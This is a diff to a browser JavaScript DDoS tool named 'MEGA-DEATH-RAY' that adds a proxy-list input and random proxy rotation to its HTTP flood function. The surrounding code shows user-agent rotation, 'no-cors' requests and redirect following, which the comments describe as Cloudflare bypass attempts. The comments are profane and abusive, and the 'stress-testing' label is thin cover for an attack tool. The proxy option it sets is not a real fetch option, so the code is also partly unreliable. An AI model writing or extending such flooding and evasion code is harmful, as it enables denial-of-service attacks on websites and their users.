@@ -1,4 +1,4 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v4.6)
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v4.7)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
@@ -146,6 +146,17 @@ requestRateInput.style.color = 'darkblue';
 requestRateInput.style.border = '1px solid purple';
 document.body.appendChild(requestRateInput);
 
+const proxyListInput = document.createElement('textarea');
+proxyListInput.placeholder = 'Enter proxy list (one proxy per line, format: ip:port)';
+proxyListInput.style.padding = '10px';
+proxyListInput.style.margin = '10px';
+proxyListInput.style.width = '300px';
+proxyListInput.style.height = '100px';
+proxyListInput.style.backgroundColor = 'black';
+proxyListInput.style.color = 'darkblue';
+proxyListInput.style.border = '1px solid purple';
+document.body.appendChild(proxyListInput);
+
 const timerDisplay = document.createElement('div');
 timerDisplay.textContent = 'MEGA-DEATH-RAY Timer: 0 seconds';
 timerDisplay.style.margin = '10px';
@@ -172,12 +183,19 @@ document.body.appendChild(logDiv);
 
 let floodInterval;
 let startTime;
+let proxies = [];
 
 function logAction(message) {
     const logList = document.getElementById('logList');
     const newLog = document.createElement('li');
     newLog.textContent = message;
     logList.appendChild(newLog);
+}
+
+function updateProxies() {
+    const proxyList = proxyListInput.value.trim();
+    proxies = proxyList.split('\n').map(proxy => proxy.trim()).filter(proxy => proxy !== '');
+    logAction(`Proxy list updated with ${proxies.length} proxies.`);
 }
 
 // Enhanced httpFlood function with improved error handling and Cloudflare bypass attempts
@@ -193,13 +211,19 @@ async function httpFlood(url, hexBytes) {
         'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
     ];
     const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+    let proxyUrl = '';
+
+    if (proxy) {
+        proxyUrl = `http://${proxy}`;
+    }
 
     // Add extra malicious headers, because why the fuck not?
     try {
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
 
-        const response = await fetch(url, {
+        let fetchOptions = {
             mode: 'no-cors', // Bypass CORS like a goddamn ninja.
             method: 'GET', // GET request – simple, effective, like a kick to the balls.
             headers: {
@@ -218,7 +242,14 @@ async function httpFlood(url, hexBytes) {
             },
             redirect: 'follow', // Follow redirects to try and bypass Cloudflare
             signal: controller.signal,
-        });
+        };
+
+        // Use proxy if available
+        if (proxy) {
+            fetchOptions.proxy = proxyUrl;
+        }
+
+        const response = await fetch(url, fetchOptions);
 
         clearTimeout(timeoutId);
 
@@ -250,6 +281,8 @@ function startDDoS(targetUrl, hexBytes, requestRate) {
         alert("Noodles Inc: Enter a valid request rate (requests/second), dumbass!");
         return;
     }
+
+    updateProxies();
 
     startButton.disabled = true;
     stopButton.disabled = false;
